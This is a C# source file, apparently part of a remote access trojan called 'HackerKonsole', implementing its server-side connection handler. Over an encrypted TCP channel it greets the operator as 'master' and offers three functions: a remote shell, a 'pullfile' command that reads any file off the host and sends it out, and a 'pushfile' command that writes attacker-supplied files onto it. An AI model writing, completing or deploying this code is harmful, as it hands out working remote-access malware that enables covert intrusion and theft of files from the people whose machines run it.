using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using HackerKonsole.ConnectionServices;
using HackerKonsoleServer.Common;

namespace HackerKonsole.ServerCore
{
    /// <summary>
    ///     A class to process connections
    /// </summary>
    public class ConnectionProcessor
    {
        #region Public Fields

        public RatServer BaseServer;
        public Dictionary<string, string> ConnectionHeaders;
        public CryptTcpClient CryptoSocket;
        public StreamReader UnencryptedInputStream;
        public StreamWriter UnencryptedOutputStream;
        public int WaitTimeout;

        #endregion Public Fields

        #region Public Constructors

        public ConnectionProcessor(TcpClient s, RatServer srv, int waitTimeout)
        {
            CryptoSocket = new CryptTcpClient(s);
            BaseServer = srv;
            WaitTimeout = waitTimeout;
        }

        #endregion Public Constructors

        #region Public Methods

        public void ParseHeaders(string[] rawHeaders)
        {
            var parsedHeaders = new Dictionary<string, string>();
            try
            {
                foreach (var rawHeaderLineToParse in rawHeaders)
                {
                    var rawHeaderLine = rawHeaderLineToParse;
                    rawHeaderLine = rawHeaderLine.Trim();
                    var separator = rawHeaderLine.IndexOf(':');
                    if (separator == -1)
                    {
                        throw new ArgumentOutOfRangeException("Invalid header line: " + rawHeaderLine);
                    }
                    var name = rawHeaderLine.Substring(0, separator).ToLowerInvariant();
                    var pos = separator + 1;
                    var value = rawHeaderLine.Substring(pos, rawHeaderLine.Length - pos);
                    Logger.WriteLine("Parsed header: {0}:{1}", name, value);
                    parsedHeaders[name] = value;
                }
                ConnectionHeaders = parsedHeaders;
            }
            catch (KillConnectionException)
            {
                Logger.WriteLine("Connection closed by client.");
            }
            catch (IndexOutOfRangeException iox)
            {
                Logger.WriteLine("Malformed headers, parse error: {0}", iox);
            }
            catch (Exception ex)
            {
                Logger.WriteLine("Generic exception parsing headers: {0}", ex);
            }
        }

        public void PerformSecureKeyExchange()
        {
            CryptoSocket.GenerateAsymmetricKeys();
            CryptoSocket.ServerPerformKeyExchange();
        }

        public void ProcessConnection()
        {
            var waiting = false;
            // StreamWriter - easy processing for output
            using (UnencryptedOutputStream = new StreamWriter(new BufferedStream(CryptoSocket.GetUnencryptedStream())))
            {
                try
                {
                    Logger.WriteLine("Performing key exchange...");
                    PerformSecureKeyExchange();
                    Logger.WriteLine("Key exchange success! Client connected.");
                    UnencryptedInputStream = new StreamReader(CryptoSocket.GetUnencryptedStream());
                    CryptoSocket.SetReceiveTimeout(WaitTimeout);
                    //Start actual session
                    var rawConnHeaders = new List<string>();
                    string recvData;
                    //Wait for HK
                    waiting = true;

                    while (
                        !(CryptoSocket.ReadLineCrypto()).Trim()
                            .Contains(CommonMessages.StartConnectionRequestIndication))
                    {
                    }
                    SendLine(CommonMessages.BeginConnectionHelloBanner); //Send welcome banner
                    //Get headers
                    while ((recvData = CryptoSocket.ReadLineCrypto())?.Trim() != "")
                    {
                        rawConnHeaders.Add(recvData);
                    }
                    recvData = null;
                    ParseHeaders(rawConnHeaders.ToArray());
                    if (ConnectionHeaders == null)
                    {
                        //Headers failed to parse
                        throw new FormatException("Failed to parse headers because they were malformed.");
                    }
                    SendLine(CommonMessages.WelcomeMaster);
                    //Interpreter mode until an error occurs; etc.
                    while (true)
                    {
                        recvData = CryptoSocket.ReadLineCrypto().Trim();
                        ParseCommand(recvData);
                    }
                }
                catch (NullReferenceException)
                {
                    Console.WriteLine("A network object was null. The client likely disconnected.");
                }
                catch (IOException)
                {
                    if (waiting)
                    {
                        Console.WriteLine("Connection timeout waiting for client.");
                    }
                }
                catch (Exception ex)
                {
                    //The ultimate catch block to prevent crashes due to bad input
                    Logger.WriteLine("Exception: {0}", ex);
                }
                finally
                {
                    UnencryptedInputStream = null;
                    UnencryptedOutputStream = null;
                }
            }
            CryptoSocket.Close();
        }

        public void SendLine(string line)
        {
            CryptoSocket.WriteLineCrypto(line);
        }

        #endregion Public Methods

        #region Private Methods

        private void ParseCommand(string command)
        {
            switch (command)
            {
                case "bye":
                case "exit":
                case "leave":
                case "kill":
                    SendLine(CommonMessages.GracefulByeMessage); //Send graceful bye message
                    throw new KillConnectionException("Client killed connection.");
                case "givemeashell":
                case "shell":
                    SendLine("Opening Shell...");
                    HKServices.RemoteShell(CryptoSocket, SendLine);
                    SendLine("Shell session closed.");
                    break;

                case "help":
                case "helpme":
                    SendLine("You don't need help, you're a h4x0r!");
                    break;

                default:
                    var customCommand = ParseCustomCommand(command);
                    if (command.Trim() != "" && !customCommand)
                        SendLine("Command not found. Type help for help.");
                    break;
            }
        }

        private bool ParseCustomCommand(string command)
        {
            int sepInd = command.IndexOf(" ", StringComparison.Ordinal);
            if (sepInd < 0)
                return false;
            string cmdName = command.Substring(0, sepInd);
            string cmdArg = command.Substring(sepInd + 1);
            switch (cmdName)
            {
                case "pullfile":
                    string remoteFileName = cmdArg;
                    SendLine(File.ReadAllBytes(remoteFileName).GetString());
                    break;

                case "pushfile":
                    string fileNameToSave = cmdArg;
                    byte[] fileHunk = CryptoSocket.ReadLineCrypto().GetBytes(); //Get a big chunk file
                    File.WriteAllBytes(fileNameToSave, fileHunk);
                    break;

                default:
                    return false;
            }
            return true;
        }

        #endregion Private Methods
    }
}